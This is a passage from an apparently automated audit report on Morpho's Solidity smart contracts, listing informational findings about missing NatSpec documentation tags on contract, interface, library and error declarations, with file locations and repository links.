[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L4)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @notice
18: contract AdaptiveCurveIrm is IIrm {

```

[18](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L18)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @notice
6: interface AggregatorV3Interface {

```

[6](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L6)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @notice
4: interface IERC4626 {

```

[4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L4)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @notice
17: interface IUniversalRewardsDistributorBase {

/// @audit missed @notice
42: interface IUniversalRewardsDistributorStaticTyping is IUniversalRewardsDistributorBase {

/// @audit missed @notice
51: interface IUniversalRewardsDistributor is IUniversalRewardsDistributorBase {

```

[17](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L17), [42](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L42), [51](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L51)




### Contract declaration should include NatSpec `@dev` documentation	_(duplicate of [NatSpec: Contract declarations should have @author, @dev, @notice and @title tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (50)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @dev
43: contract MetaMorpho is ERC4626, ERC20Permit, Ownable2Step, Multicall, IMetaMorphoStaticTyping {

```

[43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L43)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

/// @audit missed @dev
13: contract MetaMorphoFactory {

```

[13](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L13)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @dev
18: interface IMulticall {

/// @audit missed @dev
22: interface IOwnable {

```

[18](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L18), [22](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L22)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @dev
6: interface IMorphoMarketParams {

```

[6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L6)

```solidity
File: metamorpho/src/libraries/ConstantsLib.sol

/// @audit missed @dev
8: library ConstantsLib {

```

[8](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L8)

```solidity
File: metamorpho/src/libraries/ErrorsLib.sol

/// @audit missed @dev
10: library ErrorsLib {

```

[10](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L10)

```solidity
File: metamorpho/src/libraries/EventsLib.sol

/// @audit missed @dev
12: library EventsLib {

```

[12](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L12)

```solidity
File: morpho-blue-bundlers/src/ERC4626Bundler.sol

/// @audit missed @dev
16: abstract contract ERC4626Bundler is BaseBundler {

```

[16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L16)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit missed @dev
16: abstract contract MorphoBundler is BaseBundler, IMorphoBundler {

```

[16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L16)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

/// @audit missed @dev
18: abstract contract Permit2Bundler is BaseBundler {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L18)

```solidity
File: morpho-blue-bundlers/src/PermitBundler.sol

/// @audit missed @dev
12: abstract contract PermitBundler is BaseBundler {

```

[12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L12)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

/// @audit missed @dev
17: abstract contract StEthBundler is BaseBundler {

```

[17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L17)

```solidity
File: morpho-blue-bundlers/src/UrdBundler.sol

/// @audit missed @dev
15: abstract contract UrdBundler is BaseBundler {

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

/// @audit missed @dev
17: abstract contract WNativeBundler is BaseBundler {

```

[17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L17)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

/// @audit missed @dev
21: contract EthereumBundler is

```

[21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L21)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

/// @audit missed @dev
14: abstract contract EthereumPermitBundler is PermitBundler {

```

[14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L14)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumStEthBundler.sol

/// @audit missed @dev
12: abstract contract EthereumStEthBundler is StEthBundler {

```

[12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L12)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @dev
4: interface IDaiPermit {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L4)

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

/// @audit missed @dev
4: library MainnetLib {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMorphoBundler.sol

/// @audit missed @dev
15: interface IMorphoBundler is

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

/// @audit missed @dev
8: interface IMulticall {

```

[8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L8)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @dev
4: interface IStEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @dev
4: interface IWNative {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @dev
4: interface IWstEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/libraries/ErrorsLib.sol

/// @audit missed @dev
8: library ErrorsLib {

```

[8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ErrorsLib.sol#L8)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

/// @audit missed @dev
18: contract AaveV2MigrationBundler is MigrationBundler, StEthBundler {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

/// @audit missed @dev
15: contract AaveV3MigrationBundler is MigrationBundler {

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

/// @audit missed @dev
18: contract CompoundV2MigrationBundler is WNativeBundler, MigrationBundler {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

/// @audit missed @dev
15: contract CompoundV3MigrationBundler is MigrationBundler {

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

/// @audit missed @dev
17: abstract contract MigrationBundler is TransferBundler, PermitBundler, Permit2Bundler, ERC4626Bundler, MorphoBundler {

```

[17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L17)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @dev
43: interface IAaveV2 {

```

[43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

/// @audit missed @dev
61: interface IAaveV3 {

```

[61](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L61)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @dev
4: interface ICEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @dev
4: interface ICToken {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @dev
18: interface ICompoundV3 {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @dev
4: interface IComptroller {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L4)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @dev
18: contract AdaptiveCurveIrm is IIrm {

```

[18](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L18)

```solidity
File: morpho-blue-irm/src/libraries/ErrorsLib.sol

/// @audit missed @dev
8: library ErrorsLib {

```

[8](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/ErrorsLib.sol#L8)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

/// @audit missed @dev
12: library MathLib {

```

[12](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L12)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

/// @audit missed @dev
8: library UtilsLib {

```

[8](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L8)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit missed @dev
15: contract ChainlinkOracle is IOracle {

```

[15](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L15)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @dev
4: interface IERC4626 {

```

[4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L4)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

/// @audit missed @dev
12: library ChainlinkDataFeedLib {

```

[12](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L12)

```solidity
File: morpho-blue-oracles/src/libraries/ErrorsLib.sol

/// @audit missed @dev
8: library ErrorsLib {

```

[8](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L8)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

/// @audit missed @dev
10: library VaultLib {

```

[10](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L10)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit missed @dev
18: contract UniversalRewardsDistributor is IUniversalRewardsDistributorStaticTyping {

```

[18](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L18)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

/// @audit missed @dev
12: contract UrdFactory {

```

[12](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L12)

```solidity
File: universal-rewards-distributor/src/libraries/ErrorsLib.sol

/// @audit missed @dev
8: library ErrorsLib {

```

[8](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/ErrorsLib.sol#L8)

```solidity
File: universal-rewards-distributor/src/libraries/EventsLib.sol

/// @audit missed @dev
8: library EventsLib {

```

[8](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L8)




### Contract declaration should include NatSpec `@author` documentation	_(duplicate of [NatSpec: Contract declarations should have @author, @dev, @notice and @title tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (20)*:


```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @author
18: interface IMulticall {

/// @audit missed @author
22: interface IOwnable {

/// @audit missed @author
32: interface IMetaMorphoBase {

/// @audit missed @author
80: interface IMetaMorphoStaticTyping is IMetaMorphoBase {

```

[18](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L18), [22](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L22), [32](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L32), [80](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L80)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @author
6: interface IMorphoMarketParams {

```

[6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L6)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @author
4: interface IDaiPermit {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L4)

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

/// @audit missed @author
4: library MainnetLib {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @author
4: interface IStEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @author
4: interface IWNative {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @author
4: interface IWstEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @author
43: interface IAaveV2 {

```

[43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

/// @audit missed @author
61: interface IAaveV3 {

```

[61](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L61)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @author
4: interface ICEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @author
4: interface ICToken {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @author
18: interface ICompoundV3 {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @author
4: interface IComptroller {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L4)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @author
6: interface AggregatorV3Interface {

```

[6](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L6)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @author
4: interface IERC4626 {

```

[4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L4)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @author
17: interface IUniversalRewardsDistributorBase {

/// @audit missed @author
42: interface IUniversalRewardsDistributorStaticTyping is IUniversalRewardsDistributorBase {

```

[17](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L17), [42](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L42)




### Contract declaration should include NatSpec `@title` documentation	_(duplicate of [NatSpec: Contract declarations should have @author, @dev, @notice and @title tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (20)*:


```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @title
18: interface IMulticall {

/// @audit missed @title
22: interface IOwnable {

/// @audit missed @title
32: interface IMetaMorphoBase {

/// @audit missed @title
80: interface IMetaMorphoStaticTyping is IMetaMorphoBase {

```

[18](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L18), [22](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L22), [32](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L32), [80](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L80)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @title
6: interface IMorphoMarketParams {

```

[6](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L6)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @title
4: interface IDaiPermit {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L4)

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

/// @audit missed @title
4: library MainnetLib {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @title
4: interface IStEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @title
4: interface IWNative {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L4)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @title
4: interface IWstEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @title
43: interface IAaveV2 {

```

[43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

/// @audit missed @title
61: interface IAaveV3 {

```

[61](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L61)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @title
4: interface ICEth {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @title
4: interface ICToken {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L4)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @title
18: interface ICompoundV3 {

```

[18](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L18)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @title
4: interface IComptroller {

```

[4](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L4)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @title
6: interface AggregatorV3Interface {

```

[6](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L6)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @title
4: interface IERC4626 {

```

[4](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L4)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @title
17: interface IUniversalRewardsDistributorBase {

/// @audit missed @title
42: interface IUniversalRewardsDistributorStaticTyping is IUniversalRewardsDistributorBase {

```

[17](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L17), [42](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L42)




### Error declaration should include NatSpec documentation	_(duplicate of [NatSpec: Error declarations should have NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

errors should be commented to explain their purpose.

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

19:     error BadSignatory();

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L19)



### Error declaration should include NatSpec `@dev` documentation	_(duplicate of [NatSpec: Error declarations should have NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (28)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit missed @dev
20:     error NoPermission(address account);

```

[20](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L20)

```solidity
File: metamorpho/src/libraries/ErrorsLib.sol

/// @audit missed @dev
12:     error ZeroAddress();

/// @audit missed @dev
15:     error NotCuratorRole();

/// @audit missed @dev
18:     error NotAllocatorRole();

/// @audit missed @dev
21:     error NotGuardianRole();

/// @audit missed @dev
24:     error NotCuratorNorGuardianRole();

/// @audit missed @dev
27:     error UnauthorizedMarket(Id id);

/// @audit missed @dev
31:     error InconsistentAsset(Id id);

/// @audit missed @dev
34:     error SupplyCapExceeded(Id id);

/// @audit missed @dev
37:     error MaxFeeExceeded();

/// @audit missed @dev
40:     error AlreadySet();

/// @audit missed @dev
43:     error AlreadyPending();

/// @audit missed @dev
46:     error DuplicateMarket(Id id);

/// @audit missed @dev
49:     error InvalidMarketRemovalNonZeroCap(Id id);

/// @audit missed @dev
52:     error InvalidMarketRemovalNonZeroSupply(Id id);

/// @audit missed @dev
55:     error InvalidMarketRemovalTimelockNotElapsed(Id id);

/// @audit missed @dev
58:     error NoPendingValue();

/// @audit missed @dev
61:     error NotEnoughLiquidity();

/// @audit missed @dev
64:     error MarketNotCreated();

/// @audit missed @dev
67:     error MarketNotEnabled();

/// @audit missed @dev
70:     error AboveMaxTimelock();

/// @audit missed @dev
73:     error BelowMinTimelock();

/// @audit missed @dev
76:     error TimelockNotElapsed();

/// @audit missed @dev
79:     error MaxQueueLengthExceeded();

/// @audit missed @dev
82:     error ZeroFeeRecipient();

/// @audit missed @dev
85:     error InconsistentReallocation();

/// @audit missed @dev
88:     error AllCapsReached();

```

